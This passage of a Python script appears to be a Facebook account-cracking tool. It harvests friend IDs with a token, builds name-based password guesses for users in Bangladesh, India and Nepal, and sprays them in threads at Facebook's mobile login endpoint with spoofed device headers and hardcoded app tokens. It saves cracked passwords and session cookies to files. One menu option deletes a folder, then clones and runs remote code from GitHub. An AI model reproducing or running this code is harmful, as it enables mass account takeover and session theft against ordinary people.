                        animation(""" \x1b[38;5;196m[\x1b[37m5\x1b[38;5;196m]\x1b[37m RESET DETAILS""")
                        linex()
                        ankit=input(' \x1b[38;5;196m[\x1b[37m•\x1b[38;5;196m]\x1b[37m CHOOSE : ')
                        
                        if ankit in ['1','01']:
                                #clear()
                                
                                
                                linex()
                                file = input(' \x1b[38;5;196m[\x1b[37m•\x1b[38;5;196m]\x1b[37m FILE NAME : ')
                                try:
                                        fo = open(file,'r').read().splitlines()
                                except FileNotFoundError:
                                        animation(' [×] FILE NOT FOUND')
                                        time.sleep(1)
                                        menu()
                                #clear()
                                linex()
                                animation(" \x1b[38;5;196m[\x1b[37m1\x1b[38;5;196m]\x1b[37m METHOD 1 \n \x1b[38;5;196m[\x1b[37m2\x1b[38;5;196m]\x1b[37m METHOD 2 \n \x1b[38;5;196m[\x1b[37m3\x1b[38;5;196m]\x1b[37m METHOD 3 \n \x1b[38;5;196m[\x1b[37m4\x1b[38;5;196m]\x1b[37m METHOD 4 ")
                                linex()
                                xxx=input('\x1b[38;5;196m[\x1b[37m•\x1b[38;5;196m]\x1b[37m CHOOSE : ')
                                linex()                          
                                #clear()                                     
                                plist = []                                                                
                                animation(" \x1b[38;5;196m[\x1b[37m1\x1b[38;5;196m]\x1b[37m BD AUTO PASS CLONE")
                                animation(" \x1b[38;5;196m[\x1b[37m2\x1b[38;5;196m]\x1b[37m INDIA AUTO PASS CLONE")
                                animation(" \x1b[38;5;196m[\x1b[37m3\x1b[38;5;196m]\x1b[37m NEPAL AUTO PASS CLONE")
                                animation(" \x1b[38;5;196m[\x1b[37m4\x1b[38;5;196m]\x1b[37m CHOICE PASS CLONE")
                                linex()
                                ppp=input(' \x1b[38;5;196m[\x1b[37m•\x1b[38;5;196m]\x1b[37m CHOOSE : ')
                                if ppp in ['1','01']:
                                        plist.append('first last')
                                        plist.append('firstlast')
                                        plist.append('First Last')
                                        plist.append('first12345')
                                        plist.append('first1234')
                                        plist.append('first123')
                                        plist.append('first12')
                                        plist.append('first1122')
                                        plist.append('first@1234')
                                        plist.append('@first@')
                                        plist.append('first@@')
                                        plist.append('@@##@@')
                                        plist.append('last1234')
                                        plist.append('last123')
                                        plist.append('১২৩৪৫৬')
                                        plist.append('@last@')
                                        plist.append('57273200')
                                        plist.append('@firstlast@')
                                        plist.append('first@123')
                                        plist.append('firstlast123')
                                        plist.append('firstlast@123')
                                elif ppp in ['2','2']:
                                        plist.append('first last')
                                        plist.append('firstlast')
                                        plist.append('first123')
                                        plist.append('last123')
                                        plist.append('57273200')
                                        plist.append('59039200')
                                        plist.append('57575751')
                                        plist.append('07860786')
                                        plist.append('57575752')
                                elif ppp in ['3','03']:
                                        plist.append('first')
                                        plist.append('first11')
                                        plist.append('first12')
                                        plist.append('first123')
                                        plist.append('first1234')
                                        plist.append('first12345')
                                        plist.append('firstl@11')
                                        plist.append('first@12')
                                        plist.append('first@123')
                                        plist.append('first@1234')
                                        plist.append('first@12345')
                                        plist.append('firstlast')
                                        plist.append('firstlast123')
                                        plist.append('firstlast12345')
                                        plist.append('last@123')
                                        plist.append('maya123')      
                                        plist.append('maya12345')   
                                        plist.append('nepal@123')  
                                        plist.append('i love you')          
                                        plist.append('nepal@12345')       
                                        plist.append('first last')                  
                                else:
                                        try:
                                                clear()
                                                ps_limit = int(input(f'\33[1;91m[\33[1;97m✓\33[1;91m]\x1b[38;5;46m HOW MANY PASSWORD DO YOU WANT TO ADD \33[1;97m:\33[1;96m '))
                                        except:
                                                ps_limit =1
                                        clear()
                                        print(f'\33[1;91m[\33[1;97m=\33[1;91m]\x1b[38;5;46m EXAMPLE \33[1;97m➤\33[1;96m first last,firstlast,first123')
                                        
                                        linex()
                                        for i in range(ps_limit):
                                                plist.append(input(f'\33[1;91m[\33[1;97m✓\33[1;91m]\x1b[38;5;46m PASSWORD {i+1} \33[1;97m: \33[1;92m'))
                                                linex()
                               #clear()
                               # print(f'\33[1;91m[\33[1;97m=\33[1;91m]\x1b[38;5;46m DO YOU WANT TO SHOW CP ACCOUNT?? {R}[{G}y\33[1;97m|{H}n{R}] ')
                               # linex()
                                #cx=input(f'\33[1;91m[\33[1;97m✓\33[1;91m]\x1b[38;5;46m CHOICE \33[1;97m: \33[1;96m')
                               # if cx in ['y','Y','yes','Yes','1']:
                                       # pcp.append('y')
                               # else:
                                        #pcp.append('n')
                                      
                                with tred(max_workers=30) as crack_submit:
                                        clear()
                                        #linex()
                                        total_ids = str(len(fo))
                                        #print('TOTAL ID = '+total_id)  
                                        linex()
                                        print(f'\x1b[38;5;196m[\x1b[37m•\x1b[38;5;196m]\x1b[37m ADMIN : NOT ANKIT  ')
                                        print(f'\x1b[38;5;196m[\x1b[37m•\x1b[38;5;196m]\x1b[37m TOOL : FREE  ')                                      
                                        print(f' \x1b[38;5;196m[\x1b[37m•\x1b[38;5;196m]\x1b[37m TOTAL SCANNABLE IDS    : '+total_ids)                                        	                         
                                    #    print('\x1b[38;5;46mMETHOD\33[1;97m ➤ \x1b[1;96m{xxx}')                                     
                                        linex()
                                        for user in fo:
                                                ids,names = user.split('|')
                                                passlist = plist
                                                if xxx in ['1','01']:
                                                        crack_submit.submit(api1,ids,names,passlist)
                                                elif xxx in ['2','02']:
                                                        crack_submit.submit(api2,ids,names,passlist)
                                                elif xxx in ['3','03']:
                                                        crack_submit.submit(api3,ids,names,passlist)
                                                elif xxx in ['4','04']:
                                                        crack_submit.submit(ffb,ids,names,passlist)
                                print('\033[1;37m')
                                print(f'\r\33[1;95m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
                                print(f'\33[1;92m[\33[1;97m√\33[1;92m] \x1b[38;5;46mTHE PROCESS HAS COMPLETED')
                                print(f'\33[1;92m[\33[1;97m\33[1;92m]\x1b[38;5;46m TOTAL OK/CP \33[1;97m➤\33[1;92m '+str(len(oks))+'/'+str(len(cps)))
                                print(f'\r\33[1;95m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
                                input(f'\33[1;92m[\33[1;97m√\33[1;92m]\x1b[38;5;46m PRESS ENTER TO BACK ')
                                menu()
                        elif ankit in ['2','02']:
                                rndm()                               
                        elif ankit in ['3','03']:
                                public()        
                        if ankit in ['4','04']:os.system(' rm -rf FILE&&git clone --depth=1 https://github.com/Hannan-404/FILE&&cd FILE&&python FILE.py ')
                                                       
                        elif ankit in ['3','03']:
                                print('ON NEXT UPDATE');menu()                       
                        elif ankit in ['5','05']:                                                                                                                    		                        		                        
		                        passask()
		                        os.system('rm -rf data/name.xml')          
		                        os.system('rm -rf data/password.xml')	                        	                   	        
		                        animation(' \x1b[38;5;196m[\x1b[37m✓\x1b[38;5;196m]\x1b[37m RESET DONE')
		                        restart()
                           
    except requests.exceptions.ConnectionError:
                print('\n NO INTERNET CONNECTION ...')
                exit()        
                                   
##-------------------[ CRACK-PUBLIK ]----------------#

import requests
import os
import time

def public():
    token = None
    try:
        token = open('/sdcard/.token.txt', 'r').read()
        cok = open('/sdcard/.cok.txt', 'r').read()
    except IOError:
        print('[×] INVALID COOKIE')
        time.sleep(5)
        _qlog()
    try:
        linex()
        jum = int(input(' [•] ENTER TARGET AMOUNT: '))
        linex()
    except ValueError:
        linex()
        print(' [×] INVALID OPTION')
        restart()
    if not 1 <= jum <= 100000000:
        linex()
        print(' [×] TRY AGAIN')
        exit()
    
    ses = requests.Session()
    uid = []
    for i in range(jum):
        kl = input(f' [•] INPUT UID {i+1}: ')
        uid.append(kl)
    
    id_list = []
    for user_id in uid:
        try:
            params = {
                'access_token': token,
                'fields': 'friends'
            }
            response = ses.get(f'https://graph.facebook.com/{user_id}', params=params, cookies={'datr': 'K5f5ZW7drIktM160azj7Pcg3', 'sb': 'K5f5ZW8Mc3F7BW-fp3xivPnY'})
            col = response.json()
            friends_data = col.get('friends', {}).get('data', [])
            for friend in friends_data:
                friend_id = friend.get('id')
                friend_name = friend.get('name')
                iso = f'{friend_id}|{friend_name}'
                if iso not in id_list:
                    id_list.append(iso)
        except Exception as e:
            print(f'Error retrieving friends data for user {user_id}: {str(e)}')
            
    password()
    """
    linex()         
    animation(" \x1b[38;5;196m[\x1b[37m1\x1b[38;5;196m]\x1b[37m METHOD 1 \n \x1b[38;5;196m[\x1b[37m2\x1b[38;5;196m]\x1b[37m METHOD 2 \n \x1b[38;5;196m[\x1b[37m3\x1b[38;5;196m]\x1b[37m METHOD 3 \n \x1b[38;5;196m[\x1b[37m4\x1b[38;5;196m]\x1b[37m METHOD 4 ")
    linex()
    xxx=input('\x1b[38;5;196m[\x1b[37m•\x1b[38;5;196m]\x1b[37m CHOOSE : ')    
    linex()                                
                                #clear()                                     
    plist = []                                                                
    animation(" \x1b[38;5;196m[\x1b[37m1\x1b[38;5;196m]\x1b[37m NEPAL AUTO PASS CLONE")
    animation(" \x1b[38;5;196m[\x1b[37m4\x1b[38;5;196m]\x1b[37m CHOICE PASS CLONE")
    linex()                         
    ppp=input(' \x1b[38;5;196m[\x1b[37m•\x1b[38;5;196m]\x1b[37m CHOOSE : ')
    if ppp in ['1','01']:
            plist.append('first')
            plist.append('first11')
            plist.append('first12')
            plist.append('first123')
            plist.append('first1234')
            plist.append('first12345')
            plist.append('firstl@11')
            plist.append('first@12')
            plist.append('first@123')
            plist.append('first@1234')
            plist.append('first@12345')
            plist.append('firstlast')
            plist.append('firstlast123')
            plist.append('firstlast12345')
            plist.append('last@123')
            plist.append('maya123')  
    else:
            try:
                    clear()
                    ps_limit = int(input(f'\33[1;91m[\33[1;97m✓\33[1;91m]\x1b[38;5;46m HOW MANY PASSWORD DO YOU WANT TO ADD \33[1;97m:\33[1;96m '))
            except:
                    ps_limit =1
            clear()
            print(f'\33[1;91m[\33[1;97m=\33[1;91m]\x1b[38;5;46m EXAMPLE \33[1;97m➤\33[1;96m first last,firstlast,first123')
                                        
            linex()
            for i in range(ps_limit):
                    plist.append(input(f'\33[1;91m[\33[1;97m✓\33[1;91m]\x1b[38;5;46m PASSWORD {i+1} \33[1;97m: \33[1;92m'))
                    linex()     
    with tred(max_workers=70) as crack_submit:
            clear()
            total_ids = str(len(fo))                                   
            print(f' \x1b[38;5;196m[\x1b[37m•\x1b[38;5;196m]\x1b[37m TOTAL SCANNABLE IDS    : '+total_ids)                                        	                                                      
            linex()
            for user in fo:
                    ids,names = user.split('|')
                    passlist = plist
                    if xxx in ['1','01']:
                            crack_submit.submit(api1,ids,names,passlist)
                    elif xxx in ['2','02']:
                            crack_submit.submit(api2,ids,names,passlist)
                    elif xxx in ['3','03']:
                            crack_submit.submit(api3,ids,names,passlist)
                    elif xxx in ['4','04']:
                            crack_submit.submit(ffb,ids,names,passlist)                     
 """        		     		     		
def setting():
	linex()
	print(" \x1b[38;5;196m[\x1b[37m1\x1b[38;5;196m]\x1b[37m ONLY OLD IDZ")
	print(" \x1b[38;5;196m[\x1b[37m2\x1b[38;5;196m]\x1b[37m ONLY NEW IDZ")
	print(" \x1b[38;5;196m[\x1b[37m3\x1b[38;5;196m]\x1b[37m BOTH MIX IDZ")
	linex()
	hu = input(' \x1b[38;5;196m[\x1b[37m•\x1b[38;5;196m]\x1b[37m CHOOSE : ')
	if hu in ['1','01']:
		for tua in sorted(id):
			id2.append(tua)
	elif hu in ['2','02']:
		muda=[] 
		for bacot in sorted(id):
			muda.append(bacot)
		bcm=len(muda)
		bcmi=(bcm-1)
		for xmud in range(bcm):
			id2.append(muda[bcmi])
			bcmi -=1
	elif hu in ['3','03']:
		for bacot in id:
			xx = random.randint(0,len(id2))
			id2.insert(xx,bacot)
	else:
		for bacot in id:
			xx = random.randint(0,len(id2))
			id2.insert(xx,bacot)
	linex()
	method.append('mobile')
	global cekap,askc,scp
	askc += input(' \x1b[38;5;196m[\x1b[37m•\x1b[38;5;196m]\x1b[37m SHOW COOKIES : ')
	scp += input(' \x1b[38;5;196m[\x1b[37m•\x1b[38;5;196m]\x1b[37m SHOW CHECKPOINT : ')
	passwrd()
	exit() 
	
#------------[ GMAIL ]--------------#
#------------[ METHOD 1 ]--------------#
def api1(ids,names,passlist):
        try:
                global ok,loop,sim_id
                sys.stdout.write('\r\r\033[1;37m [NOT-ANKIT->M1] \x1b[38;5;196m[\x1b[37m%s\x1b[38;5;196m]|\033[1;37mOK:-\x1b[38;5;196m[\x1b[37m%s\x1b[38;5;196m] \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                        ln = fn
                session = requests.Session()
                for pw in passlist:
                        pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
                        fbbv = str(random.randint(111111111,999999999))
                        android_version = device['android_version']
                        model = device['model']
                        build = device['build']
                        fblc = device['fblc']
                        fbcr = sim_id
                        fbmf = device['fbmf']
                        fbbd = device['fbbd']
                        fbdv = device['fbdv']
                        fbsv = device['fbsv']
                        fbca = device['fbca']
                        fbdm = device['fbdm']
                        fbfw = '1'
                        fbrv = '0'
                        fban = 'FB4A'
                        fbpn = 'com.facebook.katana'
                        ua = 'Davik/2.1.0 (Linux; U; Android '+android_version+'.0.1; '+model+' Build/'+build+') [FBAN/'+fban+';FBAV/'+fbav+';FBBV/'+fbbv+';FBDM/{density=3.0,width=1440,height=8797};FBLC/'+fblc+';FBRV/'+str(random.randint(000000000,999999999))+';FBCR/'+fbcr+';FBMF/'+fbmf+';FBBD/'+fbbd+';FBPN/'+fbpn+';FBDV/'+fbdv+';FBSV/'+fbsv+';FBOP/19;FBCA/'+fbca+';]'
                        random_seed = random.Random()
                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                        device_id = str(uuid.uuid4())
                        secure = str(uuid.uuid4())
                        family = str(uuid.uuid4())
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        xd =str(''.join(random_seed.choices(string.digits, k=20)))
                        sim_serials = f'["{xd}"]'
                        li = ['28','29','210']
                        li2 = random.choice(li)
                        j1 = ''.join(random.choice(digits) for _ in range(2))
                        jazoest = li2+j1
                        data = {
                                "adid": adid,
"format": "json",
"device_id": str(uuid.uuid4()),
"email": ids,
"password": pas,
"generate_analytics_claims": "1",
"credentials_type": "password",
"source": "login",
"error_detail_type": "button_with_disabled",
"enroll_misauth": "false",
"generate_session_cookies": "1",
"generate_machine_id": "1",
"fb_api_req_friendly_name": "authenticate",}
                        headers={
                                "Accept-Encoding": "gzip, deflate",
"Accept": "*/*",
"Connection": "keep-alive",
"User-Agent": ONE(),
"Authorization": "OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32",
"X-FB-Friendly-Name": "authenticate",
"X-FB-Connection-Type": "unknown",
"Content-Type": "application/x-www-form-urlencoded",
"X-FB-HTTP-Engine": "Liger",
"Content-Length": "329",}
                        url = 'https://b-graph.facebook.com/auth/login'
                        twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                        print('\r\r\033[1;32m [ANKIT-OK] '+ids+' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        #print("Cookie: "+coki)
                                       #print("\033[1;32mChecking active and expired apps...\033[0m
                                        open('/sdcard/ANKIT-COKIE.txt','a').write(ids+'|'+pas+ ' | ' +coki+'\n')
                                        open('/sdcard/ANKIT-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                        elif twf in str(po):
                                        if 'y' in pcp:
                                                print('\r\r \033[1;34m[ANKIT-2F] '+ids+' | '+pas)
                                                twf.append(ids)
                                                break
                        elif 'www.facebook.com' in po['error']['message']:
                                        if 'y' in pcp:
                                                print('\r\r\x1b[38;5;205m [ANKIT-CP] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/ANKIT-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                                cps.append(ids)
                                        else:
                                                open('/sdcard/ANKIT-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                                cps.append(ids)
                        else:
                                        continue
                loop+=1
        except requests.exceptions.ConnectionError:
                #print("Internet Connection Error\nSleeping for 60s")
                time.sleep(20)               
        except Exception as e:               
                pass
#------------[ METHOD 2 ]--------------#		
def api2(ids,names,passlist):
        try:
                global ok,loop,sim_id
                sys.stdout.write('\r\r\033[1;37m [NOT-ANKIT->M1] \x1b[38;5;196m[\x1b[37m%s\x1b[38;5;196m]|\033[1;37mOK:-\x1b[38;5;196m[\x1b[37m%s\x1b[38;5;196m] \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                        ln = fn
                for pw in passlist:
                        pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        ios_version = random.choice(["10_0_2","10_1_1","10_2","10_2_1","10_3_1","10_3_2","10_3_3"])
                        android_version = f"Android {random.randint(4, 10)}.{random.randint(0, 9)}.{random.randint(0, 9)}"
                        facebook_version = f'{random.randint(10,437)}.0.0.{random.randint(1,99)}.{random.randint(1,200)}'
                        fbbv = str(random.randint(10000000, 99999999))
                        fbsv = f"{random.uniform(4.0, 10.0):.1f}"
                        density = random.choice(["2.0","2.25","2.75","3.0","3.25","3 75"])
                        width = random.randint(720, 1440)
                        height = random.randint(1080, 2560)
                        fblc = random.choice(["ja_JP","ex_MX","en_CU","en_US","fr_FR","fa_IR","es_ES","pt_BR","de_DE","it_IT","ja_JP","ko_KR","ru_RU","zh_CN","ar_AE","en_GB"])
                        fbcr = random.choice(["Telenor","fido","MOVO AFRICA","UFONE-PAKTel","Zong","Jazz","SCO","Jio","Vodafone","Airtel","BSNL","MTNL","Grameenphone","Robi","Banglalink","Teletalk","Telkomsel","Indosat Ooredoo","Axiata","Tri","Smartfren","China Mobile","Unicom","Telecom","Satcom","Docomo","Rakuten","IIJmio","Orange","Verizon","AT&T","T-Mobile","Sprint","Vodafone","Telefonica","EE","Orange","Three"])
                        fban = random.choice(["FB4A", "FB5A", "FB6A"])
                        fbpn = random.choice(["com.facebook.katana", "com.facebook.orca","messenger-android", "com.facebook.lite"])
                        cph = random.choice(['CPH1979','CPH1983','CPH1987','CPH2005','CPH2009','CPH2015','CPH2059','CPH2061','CPH2065','CPH2069','CPH2071','CPH2073','CPH2077','CPH2091','CPH2095','CPH2099','CPH2137','CPH2139','CPH2145','CPH2161','CPH2185','CPH2201','CPH2209','CPH1801','CPH1803','CPH1805','CPH1809','CPH1827','CPH1837','CPH1851','CPH1853','CPH2127', 'CPH2131','PDVM00','CPH2095','CPH2119','PEAT00', 'PEAM00','CPH2137','CPH2125','CPH2065','CPH2121', 'CPH2123','CPH2099','CPH2139', 'CPH2135','CPH2185','SPH2209','CPH2161','PERM00','CPH2109','CPH2113','PDYM20', 'PDYT20','PDNM00', 'PDNT00', 'CPH2089'])
                        ua = f"[FBAN/FB4A;FBAV/{facebook_version};FBBV/{fbbv};[FBAN/FB4A;FBAV/{facebook_version};FBLC/en_US;FBBV/{fbbv};FBCR/{fbcr};FBMF/Oppo;FBBD/Oppo;FBPN/com.facebook.orca;FBDV/CPH2607;FBSV/14;FBCA/armeabi-v7a:armeabi;FBDM/"+"{"+f"density={density},width={width},height={height}]"
                        random_seed = random.Random()
                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                        device_id = str(uuid.uuid4())
                        secure = str(uuid.uuid4())
                        family = str(uuid.uuid4())
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        xd =str(''.join(random_seed.choices(string.digits, k=20)))
                        sim_serials = f'["{xd}"]'
                        li = ['28','29','210']
                        li2 = random.choice(li)
                        j1 = ''.join(random.choice(digits) for _ in range(2))
                        jazoest = li2+j1
                        data={"adid": str(uuid.uuid4()),"format": "json","device_id": str(uuid.uuid4()),"cpl": "true","family_device_id": str(uuid.uuid4()),"credentials_type": "device_based_login_password","error_detail_type": "button_with_disabled","source": "device_based_login","email":ids,"password":pas,"access_token":"350685531728|62f8ce9f74b12f84c123cc23437a4a32","generate_session_cookies":"1","meta_inf_fbmeta": "","advertiser_id": str(uuid.uuid4()),"currently_logged_in_userid": "0","locale": "en_US","client_country_code": "US","method": "auth.login","fb_api_req_friendly_name": "authenticate","fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler","api_key": "882a8490361da98702bf97a021ddc14d"}
                        headers = {"Content-Type": "application/x-www-form-urlencoded","Host": "graph.facebook.com","User-Agent": TWO(),"X-FB-Net-HNI": "45204","X-FB-SIM-HNI": "45201","X-FB-Connection-Type": "MOBILE.LTE","X-Tigon-Is-Retry": "False","x-fb-session-id": "nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62","x-fb-device-group": "5120","X-FB-Friendly-Name": "ViewerReactionsMutation","X-FB-Request-Analytics-Tags": "graphservice","Accept-Encoding": "gzip, deflate","X-FB-HTTP-Engine": "Liger","X-FB-Client-IP": "True","X-FB-Server-Cluster": "True","x-fb-connection-token": "d29d67d37eca387482a8a5b740f84f62","Connection": "Keep-Alive"}
                        url = 'https://b-graph.facebook.com/auth/login'
                        twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                        print('\r\r\033[1;32m [ANKIT-OK] '+ids+' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        #print("\r\r\033[1;33m Cookie: "+coki)
                                        open('/sdcard/ANKIT-COKIE.txt','a').write(ids+'|'+pas+ ' | ' +coki+'\n')
                                        open('/sdcard/ANKIT-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                        elif twf in str(po):
                                        if 'y' in pcp:
                                                print('\r\r \033[1;34m[ANKIT-2F] '+ids+' | '+pas)
                                                twf.append(ids)
                                                break
                        elif 'www.facebook.com' in po['error']['message']:
                                        if 'y' in pcp:
                                                print('\r\r\x1b[38;5;205m [ANKIT-CP] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/ANKIT-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                                cps.append(ids)
                                        else:
                                                open('/sdcard/ANKIT-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                                cps.append(ids)
                        else:
                                        continue
                loop+=1
        except requests.exceptions.ConnectionError:
                time.sleep(20)
        except Exception as e:
                pass
#------------[ METHOD 3 ]--------------#             
def api3(ids,names,passlist):
        try:
                global ok,loop,sim_id
                sys.stdout.write('\r\r\033[1;37m [NOT-ANKIT->M3] \x1b[38;5;196m[\x1b[37m%s\x1b[38;5;196m]|\033[1;37mOK:-\x1b[38;5;196m[\x1b[37m%s\x1b[38;5;196m] \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                        ln = fn
                for pw in passlist:
                        pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
                        accessToken = ['350685531728|62f8ce9f74b12f84c123cc23437a4a32',
'438142079694454|fc0a7caa49b192f64f6f5a6d9643bb28',	'6628568379|c1e620fa708a1d5696fb991c1bde5662','1479723375646806|afb3e4a6d8b868314cc843c21eebc6ae']
                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
                        fbbv = str(random.randint(111111111,999999999))
                        android_version = device['android_version']
                        model = device['model']
                        build = device['build']
                        fblc = device['fblc']
                        fbcr = sim_id
                        fbmf = device['fbmf']
                        fbbd = device['fbbd']
                        fbdv = device['fbdv']
                        fbsv = device['fbsv']
                        fbca = device['fbca']
                        fbdm = device['fbdm']
                        fbfw = '1'
                        fbrv = '0'
                        fban = 'FB4A'
                        fbpn = 'com.facebook.katana'
                        en = random.choice(['en_US','en_GB'])
                        cph = random.choice(['CPH1979','CPH1983','CPH1987','CPH2005','CPH2009','CPH2015','CPH2059','CPH2061','CPH2065','CPH2069','CPH2071','CPH2073','CPH2077','CPH2091','CPH2095','CPH2099','CPH2137','CPH2139','CPH2145','CPH2161','CPH2185','CPH2201','CPH2209','CPH1801','CPH1803','CPH1805','CPH1809','CPH1827','CPH1837','CPH1851','CPH1853'])
                        en = random.choice(['en_US','en_GB'])
                        network = random.choice(['Zong','null','Marshmallow','Telekom China'])
                        ua = "Davik/2.1.0 (Linux; U; Android '+fbsv+'.0.0; '+model+' Build/'+''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(6))+' [FBAN/FB4A;FBAV/'+str(random.randint(111,555))+'.0.0.'+str(random.randrange(1,19))+'.'+str(random.randint(111,555))+';FBBV/'+str(random.randint(745000000,745999999))+';FBDM/{density=2.25,width=720,height=1452};FBLC/pl_PL;FBCR/T-Mobile.pl;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.adsmanager;FBDV/'+model+';FBSV/4.4.4;nullFBCA/armeabi-v7a:armeabi;]"
                        random_seed = random.Random()
                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                        device_id = str(uuid.uuid4())
                        secure = str(uuid.uuid4())
                        family = str(uuid.uuid4())
                        accessToken = ['350685531728|62f8ce9f74b12f84c123cc23437a4a32',
'438142079694454|fc0a7caa49b192f64f6f5a6d9643bb28',	'6628568379|c1e620fa708a1d5696fb991c1bde5662','1479723375646806|afb3e4a6d8b868314cc843c21eebc6ae']
                        xd =str(''.join(random_seed.choices(string.digits, k=20)))
                        sim_serials = f'["{xd}"]'
                        li = ['28','29','210']
                        li2 = random.choice(li)
                        j1 = ''.join(random.choice(digits) for _ in range(2))
                        jazoest = li2+j1
                        data = {
                                "adid": adid,
"format": "json",
"device_id": str(uuid.uuid4()),
"cpl": "true",
"family_device_id": str(uuid.uuid4()),
"credentials_type": "device_based_login_password",
"error_detail_type": "button_with_disabled",
"source": "device_based_login",
"email": ids,
"password": pas,
"access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32",
"generate_session_cookies": "1",
"meta_inf_fbmeta": "",
"advertiser_id": "8b59ed89-4b88-4f69-a1ed-dfea59e76839",
"currently_logged_in_userid": "0",
"locale": "en_US",
"client_country_code": "US",
"method": "auth.login",
"fb_api_req_friendly_name": "authenticate",
"fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
"api_key": "882a8490361da98702bf97a021ddc14d",}
                        headers={
                                'User-Agent': THREE(),
'Content-Type': 'application/x-www-form-urlencoded',
'Host': 'graph.facebook.com',
'X-FB-Net-HNI': '25227',
'X-FB-SIM-HNI': '29752',
'X-FB-Connection-Type': 'MOBILE.LTE',
'X-Tigon-Is-Retry': 'False',
'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
'x-fb-device-group': '5120',
'X-FB-Friendly-Name': 'ViewerReactionsMutation',
'X-FB-Request-Analytics-Tags': 'graphservice',
'X-FB-HTTP-Engine': 'Liger',
'X-FB-Client-IP': 'True',
'X-FB-Server-Cluster': 'True',
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',
'Content-Length': '706'}
                        url = 'https://b-graph.facebook.com/auth/login'
                        twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                        print('\r\r\033[1;32m [ANKIT-OK] '+ids+' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        #print("\r\r\033[1;33m Cookie: "+coki)
                                        open('/sdcard/ANKIT-COKIE.txt','a').write(ids+'|'+pas+ ' | ' +coki+'\n')
                                        open('/sdcard/BRAND-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                        elif twf in str(po):
                                        if 'y' in pcp:
                                                print('\r\r \033[1;34m[ANKIT-2F] '+ids+' | '+pas)
                                                twf.append(ids)
                                                break
                        elif 'www.facebook.com' in po['error']['message']:
                                        if 'y' in pcp:
                                                print('\r\r\x1b[38;5;205m [ANKIT-CP] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/BRAND-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                                cps.append(ids)
                                        else:
                                                open('/sdcard/BRAND-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                                cps.append(ids)
                        else:
                                        continue
                loop+=1
        except Exception as e:
                pass
#------------[ METHOD 4 ]--------------#                
def ffb(ids,names,passlist):
        try:
                global ok,loop,sim_id
                sys.stdout.write('\r\r\033[1;37m [NOT-ANKIT->M4] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                        ln = fn
                for pw in passlist:
                        pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
                        accessToken = ['350685531728|62f8ce9f74b12f84c123cc23437a4a32',
